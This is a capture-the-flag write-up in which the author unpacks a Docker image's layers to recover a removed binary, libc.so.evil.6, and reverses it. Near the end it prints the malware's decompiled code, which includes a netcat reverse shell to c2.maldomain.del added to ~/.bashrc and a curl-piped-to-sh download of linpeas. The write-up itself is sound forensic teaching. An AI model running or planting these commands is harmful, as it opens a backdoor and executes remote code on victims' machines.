---
title: HackyHolidays - Protect the supply - Writeup
tags: hackyholidays malware linux forensics reversing
---

# Description

This challenge was in both the forensics and reversing categories

![image](https://user-images.githubusercontent.com/84577967/178866898-e4fcedc6-2d0d-4bc2-a2de-8237f9e290a8.png)

# Solution

The challenge is a container that can be pulled using the command described in the challenge description.

```bash
docker run -ti hackazon/micro_ghost /bin/sh
```

As a fan of `bash` shell, I had to change the `/bin/sh` to `/bin/bash`

```bash
docker run -ti hackazon/micro_ghost /bin/bash
```

![image](https://user-images.githubusercontent.com/84577967/178867304-81b759ea-a401-424c-9980-758741ec271b.png)

After we pull up the full docker image, we can investigate the command history

```bash
docker history IMAGEID
```

Of course we have to change the `IMAGEID` value and to retrieve the challenge image id we can use this simple command

```bash
docker image ls | grep hackazon/micro_ghost
```

![image](https://user-images.githubusercontent.com/84577967/178867433-0514a809-4f6c-4ce0-8fe8-4a81a7187c24.png)


```bash
docker history fc6642d32b03
```

![image](https://user-images.githubusercontent.com/84577967/178867679-d7af4be8-2293-480f-9441-5cdf8b75a792.png)

The output of the command may not be complete, but we can add additional arguments and use the `jq` tool to beautify the output.

{% raw %}
```bash
docker history --format "{{json .}}" fc6642d32b03 --no-trunc |jq .
```
{% endraw %}

![image](https://user-images.githubusercontent.com/84577967/178867846-7fa527fb-30c7-40c9-b470-66625e2d9e6a.png)

The full output:

```json
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:23:06+01:00",
  "CreatedBy": "/bin/sh -c rm /lib/x86_64-linux-gnu/libc.so.evil.6",
  "CreatedSince": "7 days ago",
  "ID": "sha256:fc6642d32b03e5c96e96299b64ca355bcfea30ef6ad4dec984f2601129210bbb",
  "Size": "0B"
}
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:23:04+01:00",
  "CreatedBy": "/bin/sh -c /lib/x86_64-linux-gnu/libc.so.evil.6",
  "CreatedSince": "7 days ago",
  "ID": "<missing>",
  "Size": "0B"
}
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:23:03+01:00",
  "CreatedBy": "/bin/sh -c mv /opt/libc.so.6 /opt/libc.so.evil.6",
  "CreatedSince": "7 days ago",
  "ID": "<missing>",
  "Size": "1.9MB"
}
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:23:02+01:00",
  "CreatedBy": "/bin/sh -c chmod +x /lib/x86_64-linux-gnu/libc.so.evil.6",
  "CreatedSince": "7 days ago",
  "ID": "<missing>",
  "Size": "14.4kB"
}
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:23:00+01:00",
  "CreatedBy": "/bin/sh -c #(nop) COPY file:46b15dd2b1c1b2421f8f66c0e0b1adbb2be1fa29bdfb24df21ab41a4393cc4ca in /opt/ld-linux-x86-64.so.2 ",
  "CreatedSince": "7 days ago",
  "ID": "<missing>",
  "Size": "204kB"
}
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:23:00+01:00",
  "CreatedBy": "/bin/sh -c #(nop) COPY file:5f853a35eb22d7cd0b3789fdf55937ebf492d63386894ed02ab7d6fa7717ff30 in /opt/libc.so.6 ",
  "CreatedSince": "7 days ago",
  "ID": "<missing>",
  "Size": "1.9MB"
}
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:22:59+01:00",
  "CreatedBy": "/bin/sh -c #(nop) COPY file:1d19734b949df42e538d10ea3e6c9eb33e3f2064be2540a446c095ee007af323 in /lib/x86_64-linux-gnu/libc.so.evil.6 ",
  "CreatedSince": "7 days ago",
  "ID": "<missing>",
  "Size": "14.4kB"
}
{
  "Comment": "",
  "CreatedAt": "2022-06-06T23:21:26+01:00",
  "CreatedBy": "/bin/sh -c #(nop)  CMD [\"bash\"]",
  "CreatedSince": "5 weeks ago",
  "ID": "<missing>",
  "Size": "0B"
}
{
  "Comment": "",
  "CreatedAt": "2022-06-06T23:21:25+01:00",
  "CreatedBy": "/bin/sh -c #(nop) ADD file:11157b07dde10107f3f6f2b892c869ea83868475d5825167b5f466a7e410eb05 in / ",
  "CreatedSince": "5 weeks ago",
  "ID": "<missing>",
  "Size": "77.8MB"
}
```

What took my attention is the third value from bottom, where a weird file was copied to the container `/lib/x86_64-linux-gnu/libc.so.evil.6`

```json
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:22:59+01:00",
  "CreatedBy": "/bin/sh -c #(nop) COPY file:1d19734b949df42e538d10ea3e6c9eb33e3f2064be2540a446c095ee007af323 in /lib/x86_64-linux-gnu/libc.so.evil.6 ",
  "CreatedSince": "7 days ago",
  "ID": "<missing>",
  "Size": "14.4kB"
}
```

But it seems like it was removed 

![image](https://user-images.githubusercontent.com/84577967/178868216-05856585-5204-49e1-b0b6-25c658d0ef37.png)

And this what we can notice in the last command

```json
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:23:06+01:00",
  "CreatedBy": "/bin/sh -c rm /lib/x86_64-linux-gnu/libc.so.evil.6",
  "CreatedSince": "7 days ago",
  "ID": "sha256:fc6642d32b03e5c96e96299b64ca355bcfea30ef6ad4dec984f2601129210bbb",
  "Size": "0B"
}
```

And just seconds before that it was executed

```json
{
  "Comment": "",
  "CreatedAt": "2022-07-06T14:23:04+01:00",
  "CreatedBy": "/bin/sh -c /lib/x86_64-linux-gnu/libc.so.evil.6",
  "CreatedSince": "7 days ago",
  "ID": "<missing>",
  "Size": "0B"
}
```

In order to find the original file, we need to examine the preceding layers of the Docker image. One way to do this is by saving the image to a tar archive, which allows us to easily examine the individual layers of the image.

```bash
docker save fc6642d32b03 > fc6642d32b03.tar
```

After extracting the tar file, we can locate a file called `manifest.json`, which contains information about all the layers of the image. This file can be useful in our investigation.

![image](https://user-images.githubusercontent.com/84577967/178868876-4b131905-8e26-46e2-8055-edfeb0d9ec21.png)

The file was copied in the third operation, and the second operation was just a CMD command. This means that the binary file we are looking for may be located in the second layer of the image `104337d79b4c7be52c587e29595ddf09df584bd991875e10392a0fc1fd901b57/layer.tar`.

![image](https://user-images.githubusercontent.com/84577967/178869275-0e071309-fcf8-4e51-8d5a-32c55f1db72b.png)

Let's open it in `Cutter` to disassemble the binary and gain a deeper understanding of what it does

![image](https://user-images.githubusercontent.com/84577967/178871965-9a8941ef-aae7-44da-b837-de160fdc5ccd.png)

Upon examining the functions of the binary, it appears that it may be a type of malware.

![image](https://user-images.githubusercontent.com/84577967/178872535-5ff482ec-95c6-49f5-bc99-07121fce5e9a.png)

![image](https://user-images.githubusercontent.com/84577967/178872988-1924c75e-1aaf-40ee-b768-3c17ebcca50f.png)

![image](https://user-images.githubusercontent.com/84577967/178877053-a128d4f5-b6a5-4757-a4da-5f4703b9ca3c.png)

In the screenshot below, the third function appears to be a loop that retrieves its values from the main function.

![image](https://user-images.githubusercontent.com/84577967/178877935-a1227b25-ee6f-4778-9827-9a577b954532.png)

In order to safely run the binary and see what it does, we can copy it to a `Ubuntu` container. This will allow us to examine the malware's behavior without exposing our host system to any potential risks.

![image](https://user-images.githubusercontent.com/84577967/178881692-9f8b49c1-4d1a-4f69-8370-181bcd329351.png)

Based on the functions we have analyzed, it seems that the malware performs the actions that we have identified.

```C
void fcn.00001208(void)
{
    system("apt install netcat");
    system("apt install wget");
    system("echo \'nc c2.maldomain.del 4444 -e /bin/bash >> ~/.bashrc\'");
    system("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh >lin.log");
    return;
}
```

The third function with the loop was not initially visible to us. 
However, using the ltrace tool has allowed us to see this function and gain a better understanding of the malware's behavior.

![image](https://user-images.githubusercontent.com/84577967/178882405-f8c61a1f-ee66-4cc7-9a92-9fa9c36113c3.png)

By default, ltrace limits the output of strings to 32 characters. However, we can use additional arguments to change this behavior `-s "number of strings"` and view longer strings if needed.

```bash
ltrace -s 200 ./libc.so.evil.6
```

# Flag

We were able to successfully retrieve the flag for the challenge.

![image](https://user-images.githubusercontent.com/84577967/178882767-4f9706a0-ff9b-41ac-a9f5-add41e77b7a8.png)

